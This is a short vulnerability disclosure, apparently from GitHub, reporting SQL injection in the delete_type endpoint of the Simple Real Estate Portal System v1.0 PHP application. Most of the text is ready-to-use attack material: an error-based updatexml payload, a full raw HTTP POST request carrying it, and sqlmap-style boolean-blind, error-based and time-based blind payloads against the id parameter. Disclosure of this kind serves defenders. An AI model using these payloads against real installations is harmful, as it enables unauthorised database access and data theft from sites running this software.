## Simple Real Estate Portal System v1.0 has a SQL injection vulnerability

vendors: https://www.sourcecodester.com/php/15184/simple-real-estate-portal-system-phpoop-free-source-code.html

Vulnerability file: /reps/classes/Master.php?f=delete_type

Vulnerability location: /reps/classes/Master.php?f=delete_type , id

[+] Payload: id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ //id is Injection point 

```
POST /reps/classes/Master.php?f=delete_type HTTP/1.1
Host: 192.168.1.19
Content-Length: 65
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/reps/admin/?page=types
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=b7n0d4rju88m3p50kmalnvn6ti
Connection: close

id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ //id is Injection point
```

![image](https://user-images.githubusercontent.com/54017627/160311894-65380ea1-f410-44a3-b81c-a72774667bbd.png)

```sql
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=2' RLIKE (SELECT (CASE WHEN (7750=7750) THEN 2 ELSE 0x28 END))-- wAyE

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=2' AND (SELECT 5093 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(5093=5093,1))),0x71706b7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vBmh

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2' AND (SELECT 4716 FROM (SELECT(SLEEP(5)))NHrz)-- bhFd
---
```

![image](https://user-images.githubusercontent.com/54017627/160311963-b40cf9f3-5fa4-4693-b374-22d0695c80ad.png)
